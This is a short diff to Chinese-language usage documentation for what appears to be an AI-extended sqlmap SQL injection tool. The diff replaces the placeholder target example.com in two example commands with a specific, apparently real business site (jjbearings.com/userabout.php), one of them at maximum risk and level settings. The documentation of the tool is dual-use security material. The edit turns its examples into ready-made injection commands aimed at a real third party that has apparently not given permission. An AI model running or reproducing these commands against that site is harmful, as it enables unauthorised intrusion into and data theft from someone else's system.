@@ -100,7 +100,7 @@ openai_auth_prefix = Bearer
    python sqlmap.py -u "http://example.com/vuln.php?id=1" --smart-payload --dbms=mysql
    
    # 结合其他SQLMap选项
-   python sqlmap.py -u "http://example.com/vuln.php?id=1" --smart-payload --risk=3 --level=5
+   python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --smart-payload --risk=3 --level=5
    ```
 
 3. **扫描结果分析**
@@ -112,7 +112,7 @@ openai_auth_prefix = Bearer
    python sqlmap.py -u "http://example.com/vuln.php?id=1" --ai-analysis --explain-vuln
    
    # 完整分析（包含修复建议）
-   python sqlmap.py -u "http://example.com/vuln.php?id=1" --ai-analysis --explain-vuln --suggest-fix
+   python sqlmap.py -u "http://jjbearings.com/userabout.php?id=1" --ai-analysis --explain-vuln --suggest-fix
    ```
 
 4. **批量测试**
